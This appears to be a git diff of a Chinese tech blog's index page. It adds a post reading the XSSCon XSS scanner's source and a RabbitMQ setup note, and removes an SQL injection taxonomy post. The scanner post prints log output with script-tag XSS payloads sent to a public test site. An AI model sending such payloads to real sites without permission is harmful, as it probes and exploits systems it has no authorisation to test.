@@ -252,6 +252,398 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/01/XSScon源码-Simple XSS Scanner tool/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Foolisheddy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/04/26/5cc1da1c90e1a.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Black House">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/01/XSScon源码-Simple XSS Scanner tool/" itemprop="url">XSScon源码-Simple XSS Scanner tool</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-01T14:36:34+08:00">
+                2019-07-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/SourceCodeReading/" itemprop="url" rel="index">
+                    <span itemprop="name">SourceCodeReading</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>同事在用<a href="https://github.com/menkrep1337/XSSCon" target="_blank" rel="noopener">XSSCon</a>来测试xss漏洞,然后发现run不起来,然后我帮它debug了一下,顺手提了pr.</p>
+<p>我稍微瞄了一下这个工具的xss scanner的代码,发现精简得很,所以看一看它源码.</p>
+<hr>
+<h1 id="检测效果"><a href="#检测效果" class="headerlink" title="检测效果:"></a>检测效果:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">__  ______ ____   ____</span><br><span class="line">\ \/ / ___/ ___| / ___|___  _ __</span><br><span class="line"> \  /\___ \___ \| |   / _ \| &apos;_ \ &#123;v0.5 Final&#125;</span><br><span class="line"> /  \ ___) |__) | |__| (_) | | | | https://github.com/menkrep1337/XSSCon</span><br><span class="line">/_/\_\____/____/ \____\___/|_| |_|</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line"></span><br><span class="line">[16:20:31] [INFO] Starting XSSCon...</span><br><span class="line">***************</span><br><span class="line">[16:20:31] [INFO] Checking connection to: http://testphp.vulnweb.com</span><br><span class="line">[16:20:32] [INFO] Connection estabilished 200</span><br><span class="line">[16:20:32] [WARNING] Target have form with POST method: http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:32] [INFO] Collecting form input key.....</span><br><span class="line">[16:20:32] [INFO] Form key name: searchFor value: &lt;script&gt;console.log(5000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:32] [INFO] Form key name: goButton value: &lt;Submit Confirm&gt;</span><br><span class="line">[16:20:32] [INFO] Sending payload (POST) method...</span><br><span class="line">[16:20:33] [CRITICAL] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:33] [CRITICAL] Post data: &#123;&apos;searchFor&apos;: &apos;&lt;script&gt;console.log(5000/3000)&lt;/script&gt;&apos;, &apos;goButton&apos;: &apos;goButton&apos;&#125;</span><br><span class="line">***************</span><br><span class="line">[16:20:34] [INFO] Checking connection to: http://testphp.vulnweb.com/index.php</span><br><span class="line">[16:20:36] [INFO] Connection estabilished 200</span><br><span class="line">[16:20:36] [WARNING] Target have form with POST method: http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:36] [INFO] Collecting form input key.....</span><br><span class="line">[16:20:36] [INFO] Form key name: searchFor value: &lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:36] [INFO] Form key name: goButton value: &lt;Submit Confirm&gt;</span><br><span class="line">[16:20:36] [INFO] Sending payload (POST) method...</span><br><span class="line">[16:20:37] [CRITICAL] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:37] [CRITICAL] Post data: &#123;&apos;searchFor&apos;: &apos;&lt;script&gt;alert(6000/3000)&lt;/script&gt;&apos;, &apos;goButton&apos;: &apos;goButton&apos;&#125;</span><br><span class="line">***************</span><br><span class="line">[16:20:39] [INFO] Checking connection to: http://testphp.vulnweb.com/categories.php</span><br><span class="line">[16:20:40] [INFO] Connection estabilished 200</span><br><span class="line">[16:20:40] [WARNING] Target have form with POST method: http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:40] [INFO] Collecting form input key.....</span><br><span class="line">[16:20:40] [INFO] Form key name: searchFor value: &lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:40] [INFO] Form key name: goButton value: &lt;Submit Confirm&gt;</span><br><span class="line">[16:20:40] [INFO] Sending payload (POST) method...</span><br><span class="line">[16:20:41] [CRITICAL] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:41] [CRITICAL] Post data: &#123;&apos;searchFor&apos;: &apos;&lt;script&gt;alert(6000/3000)&lt;/script&gt;&apos;, &apos;goButton&apos;: &apos;goButton&apos;&#125;</span><br><span class="line">[16:20:41] [WARNING] Found link with query: cat=1 Maybe a vuln XSS point</span><br><span class="line">[16:20:41] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:41] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E</span><br><span class="line">[16:20:42] [CRITICAL] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(6000/3000)%3C/script%3E</span><br><span class="line">[16:20:42] [WARNING] Found link with query: cat=2 Maybe a vuln XSS point</span><br><span class="line">[16:20:42] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:42] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E</span><br><span class="line">[16:20:42] [CRITICAL] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(6000/3000)%3C/script%3E</span><br><span class="line">[16:20:42] [WARNING] Found link with query: cat=3 Maybe a vuln XSS point</span><br><span class="line">[16:20:42] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:42] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E</span><br><span class="line">[16:20:43] [CRITICAL] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(6000/3000)%3C/script%3E</span><br><span class="line">[16:20:43] [WARNING] Found link with query: cat=4 Maybe a vuln XSS point</span><br><span class="line">[16:20:43] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:43] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E</span><br><span class="line">[16:20:43] [CRITICAL] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(6000/3000)%3C/script%3E</span><br><span class="line">***************</span><br></pre></td></tr></table></figure>
+
+<p>省略了很多,通过输出可以大致了解一下他的流程。。</p>
+<hr>
+<h1 id="搭建靶机环境"><a href="#搭建靶机环境" class="headerlink" title="搭建靶机环境:"></a>搭建靶机环境:</h1><p>phpstudy + xss练习平台代码. 方便调试…</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.107/xss/level2.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/07/08/5d2329cfae51367657.png" alt=""></p>
+<hr>
+<h1 id="主要流程"><a href="#主要流程" class="headerlink" title="主要流程:"></a>主要流程:</h1><h2 id="命令行参数解析"><a href="#命令行参数解析" class="headerlink" title="命令行参数解析:"></a>命令行参数解析:</h2><p><img src="https://i.loli.net/2019/07/09/5d24ab505d76037106.png" alt=""></p>
+<p>都是常规的一些参数,所以就略过.</p>
+<p>可以看到里面含cralwer参数,可见是个带有爬虫功能的主动发包的scanner.</p>
+<hr>
+<h2 id="检查可用性"><a href="#检查可用性" class="headerlink" title="检查可用性:"></a>检查可用性:</h2><p><img src="https://i.loli.net/2019/07/09/5d24ac9d8fc6950212.png" alt=""></p>
+<p>在开始探测之前,会检查一下该url的”连通性”.</p>
+<p>作者本意是通过返回包的状态码<code>status_code</code>,认为大于400就是”连接失败”.</p>
+<p>这里用<code>connection</code>应该是不准确的.</p>
+<p><strong>有任一状态码都认为是服务器有回复,即是连通的.<br>连通性有问题的话,应该是请求超时,服务器无响应.</strong></p>
+<p>所以,这里我觉得是检查该探测行为(xss检测)情况下,这个url的可用性.</p>
+<p>xss检测的话,只要能正常访问页面,状态码是2xx或者3xx都是ok的.</p>
+<p>而检测服务器报错的时候,状态码是5xx也是ok的。</p>
+<p>检测服务器报错的时候常常是构造异常的url(数据包),服务器无法正常处理,然后报错,可能会把报错信息输出在页面上.</p>
+<p>这种情况下,状态码一般都是<code>5xx</code>(大于400),那么是这个时候服务器是有响应的,有处理你的请求的,不能认为是连通性有问题.</p>
+<p><strong>不同检测方式,判定url的可用性应该是不一样的</strong>。</p>
+<hr>
+<h2 id="三类请求的检测"><a href="#三类请求的检测" class="headerlink" title="三类请求的检测:"></a>三类请求的检测:</h2><h3 id="get-method"><a href="#get-method" class="headerlink" title="get_method:"></a>get_method:</h3><p>形式:get方法提交的键值对参数</p>
+<p>例如:<code>xxx.com/index.php?id=1</code></p>
+<p><img src="https://i.loli.net/2019/07/09/5d24b236456b846479.png" alt=""></p>
+<p><img src="https://i.loli.net/2019/07/09/5d24b1cd0761e69063.png" alt=""></p>
+<p>判断方式是看xss payload有没在返回包的源码中,简单粗暴但容易误报.</p>
+<p>这里面还有个细节就是发了两次请求包.</p>
+<p>为什么要发两次请求包呢?要多发个<code>urlencode</code>后的包呢?</p>
+<p>因为有些特殊的字符要<code>urlencode</code>之后,服务器才能正常正确的处理.例如<code>&amp;</code>等.<br>之前在写api的时候,试过<code>token</code>值里面带了<code>&amp;</code>这个符号后,api程序不能正常解析,认为这是个不合法的<code>token</code>.</p>
+<blockquote>
+<p><strong>HTTP协议中参数组件的传输是<code>key=value</code>键值对的形式，如果要传输多个参数就需要用<code>&amp;</code>符号对键值对进行分隔。</strong>例如?name1=value1&amp;name2=$value2,这样在服务器收到这种字符串的时候，会用“&amp;”分隔出每一个参数，然后再用“=”来分隔出参数值。</p>
+</blockquote>
+<blockquote>
+<p>如果我的参数值中就包含<code>=</code>或者<code>&amp;</code>这样的特殊子字符的时候，该怎么办。比如说<code>name1=value1</code>,其中value1的值是<code>va&amp;lu=e1</code>，那么在传输过程中就会变成<code>name1=va&amp;lu=e1</code>。<strong>用户传输的本意是只有一个键值对，但是服务器端会解析成两个键值对，这样就自然的产生了歧义。</strong></p>
+</blockquote>
+<blockquote>
+<p><strong>URL编码只是简单的在特殊字符的各个字节（16进制）前加上<code>%</code>即可。</strong>例如，我们对上述会产生歧义的字符进行编码后的结果：<code>name1=va%26lu%3D</code>，这样服务器会把紧跟在<code>%</code>后的字节当成普通的字节，不会把它当成各个参数或键值对的分隔符。</p>
+</blockquote>
+<hr>
+<h3 id="get-method-form"><a href="#get-method-form" class="headerlink" title="get_method_form:"></a>get_method_form:</h3><p>form表单通过get方法提交.</p>
+<p><img src="https://i.loli.net/2019/07/09/5d24b45770e6258699.png" alt=""><br><img src="https://i.loli.net/2019/07/09/5d24b4881707412169.png" alt=""></p>
+<p>其中可以学到的点就是</p>
+<p>构造请求包的思路:</p>
+<ul>
+<li>找到<code>form</code>标签</li>
+<li>找出<code>input</code>,<code>textarea</code>属性,解析参数值对</li>
+</ul>
+<hr>
+<h3 id="post-method："><a href="#post-method：" class="headerlink" title="post_method："></a>post_method：</h3><p>form表单通过post方法提交.</p>
+<p><img src="https://i.loli.net/2019/07/09/5d24b528adc3c84990.png" alt=""></p>
+<p>这个大体跟<code>get_method_form</code>相似.略过</p>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>这个xss scanner代码量很少,只能算个简单的黑盒静态检测Xss的scanner,容易误报.</p>
+<ul>
+<li>代码虽少,但是可以通过这个工具简单的了解到一个黑盒静态检测的xss scanner是怎么写的,也是非常不错的哈哈哈.</li>
+<li><strong>不同检测方式,判定url的可用性应该是不一样的</strong>。</li>
+<li><strong>有任一状态码都认为是服务器有回复,即是连通的.连通性有问题的话,应该是请求超时,服务器无响应.</strong></li>
+<li><strong>HTTP协议中参数组件的传输是<code>key=value</code>键值对的形式，如果要传输多个参数就需要用<code>&amp;</code>符号对键值对进行分隔。</strong>如果参数值中就包含<code>=</code>或者<code>&amp;</code>这样的特殊子字符的时候，<strong>用户传输的本意是只有一个键值对，但是服务器端会解析成两个键值对，这样就自然的产生了歧义。</strong>这个时候就要用URL编码,<strong>URL编码只是简单的在特殊字符的各个字节（16进制）前加上<code>%</code>即可。</strong></li>
+</ul>
+<blockquote>
+<p>含注释的代码在<code>https://github.com/jerrychan807/XSSCon/tree/comment</code></p>
+</blockquote>
+<hr>
+<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
+<li><a href="https://www.cnblogs.com/jerrysion/p/5522673.html" target="_blank" rel="noopener">为什么要进行URL编码</a></li>
+<li><a href="https://github.com/menkrep1337/XSSCon" target="_blank" rel="noopener">XSSCon</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/30/记录-RabbitMq-Install/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Foolisheddy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/04/26/5cc1da1c90e1a.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Black House">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/30/记录-RabbitMq-Install/" itemprop="url">记录-RabbitMq-Install</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-30T14:36:34+08:00">
+                2019-06-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Dev/" itemprop="url" rel="index">
+                    <span itemprop="name">Dev</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p><code>celery</code>+<code>redis</code> 经常会出现重复任务.</p>
+<p>所以打算用<code>rabbitmq</code>替换<code>redis</code>.</p>
+<hr>
+<h1 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装:"></a>下载与安装:</h1><h2 id="erlang"><a href="#erlang" class="headerlink" title="erlang:"></a>erlang:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装erlang</span></span><br><span class="line">yum install erlang -y</span><br></pre></td></tr></table></figure>
+
+<h2 id="rabbitmq"><a href="#rabbitmq" class="headerlink" title="rabbitmq:"></a>rabbitmq:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装RabbitMQ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载rpm</span></span><br><span class="line">wget http://www.rabbitmq.com/releases/rabbitmq-server/v3.6.6/rabbitmq-server-3.6.6-1.el7.noarch.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">yum install rabbitmq-server-3.6.6-1.el7.noarch.rpm -y</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 完成后启动服务：</span></span><br><span class="line">service rabbitmq-server start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以查看服务状态：</span></span><br><span class="line">service rabbitmq-server status</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 激活开机启动命令</span></span><br><span class="line">systemctl <span class="built_in">enable</span> rabbitmq-server.service</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置:"></a>初始化配置:</h1><h2 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件:"></a>创建配置文件:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/rabbitmq/</span><br><span class="line">vi rabbitmq.config</span><br><span class="line"><span class="comment"># 编辑内容如下：</span></span><br><span class="line">[&#123;rabbit, [&#123;loopback_users, []&#125;]&#125;].</span><br></pre></td></tr></table></figure>
+
+<p>这里的意思是开放使用，rabbitmq默认创建的用户<code>guest</code>，密码也是<code>guest</code>，这个用户默认只能是本机访问，localhost或者127.0.0.1，从外部访问需要添加上面的配置。</p>
+<h2 id="用户设置"><a href="#用户设置" class="headerlink" title="用户设置:"></a>用户设置:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加用户</span></span><br><span class="line">rabbitmqctl add_user celery celery</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加虚拟主机</span></span><br><span class="line">rabbitmqctl add_vhost myvhost</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 赋予用户权限</span></span><br><span class="line">rabbitmqctl set_permissions -p myvhost celery <span class="string">".*"</span> <span class="string">".*"</span> <span class="string">".*"</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="修改celery配置文件"><a href="#修改celery配置文件" class="headerlink" title="修改celery配置文件:"></a>修改celery配置文件:</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CELERY_BROKER_URL = <span class="string">'amqp://celery:celery@your_ip:5672/myvhost'</span></span><br><span class="line">CELERY_RESULT_BACKEND = <span class="string">'amqp://celery:celery@your_ip:5672/myvhost'</span></span><br></pre></td></tr></table></figure>
+
+<p>修改配置文件后,就可以无缝接入<code>rabbitmq</code>,成功替换掉<code>redis</code>了.</p>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>只能说这个分布式队列的框架设计得特别好,把功能解耦开了,以至于在替换其中一个组件的时候,是如此的方便,无痛.</p>
+<p>好的程序设计思想:<strong>高内聚,低耦合</strong>永不过时.</p>
+<p>如果一开始贪快,没有设计好模块间的关系,初期可能感觉关系不大.</p>
+<p>但是到了后期要拓展,要debug的时候,才会发现把模块解耦的巨大好处.</p>
+<p>所以一开始的模块设计还是要花点心思的.多画画图,没什么坏处.</p>
+<hr>
+<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
+<li><a href="https://www.cnblogs.com/uptothesky/p/6094357.html" target="_blank" rel="noopener">在CentOS7上安装RabbitMQ</a></li>
+<li><a href="https://blog.csdn.net/lanyang123456/article/details/77115868" target="_blank" rel="noopener">celery+Rabbit MQ的安装和使用</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/23/Notes-代码之外的功夫:程序员精进之路读后感/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1770,590 +2162,6 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/Sqli-注入的分类/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Foolisheddy">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://i.loli.net/2019/04/26/5cc1da1c90e1a.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Black House">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/05/01/Sqli-注入的分类/" itemprop="url">Sqli-注入的分类</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-01T14:36:34+08:00">
-                2019-05-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/WebSecurity/" itemprop="url" rel="index">
-                    <span itemprop="name">WebSecurity</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h1><ul>
-<li>基于错误的SQL注入</li>
-<li>联合查询的类型</li>
-<li>堆查询注射</li>
-<li>SQL盲注</li>
-<li>基于布尔SQL盲注</li>
-<li>基于时间的SQL盲注</li>
-<li>基于报错的SQL盲注</li>
-</ul>
-<h1 id="基于如何处理输入的SQL查询-数据类型"><a href="#基于如何处理输入的SQL查询-数据类型" class="headerlink" title="基于如何处理输入的SQL查询(数据类型)"></a>基于如何处理输入的SQL查询(数据类型)</h1><ul>
-<li>基于字符串</li>
-<li>数字或整数为基础</li>
-</ul>
-<h1 id="基于程度和顺序的注入-哪里发生了影响"><a href="#基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="基于程度和顺序的注入(哪里发生了影响)"></a>基于程度和顺序的注入(哪里发生了影响)</h1><ul>
-<li><p>一阶注射</p>
-</li>
-<li><p>二阶注射</p>
-</li>
-</ul>
-<p>一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.</p>
-<h1 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h1><ul>
-<li>通过用户输入的表单域的注射</li>
-<li>通过cookie注射</li>
-<li>通过服务器变量注射(基于头部信息的注射)</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/Sqli-SQL injection cheat sheet/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Foolisheddy">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://i.loli.net/2019/04/26/5cc1da1c90e1a.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Black House">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/05/01/Sqli-SQL injection cheat sheet/" itemprop="url">SQL injection cheat sheet</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-01T14:36:34+08:00">
-                2019-05-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/WebSecurity/" itemprop="url" rel="index">
-                    <span itemprop="name">WebSecurity</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
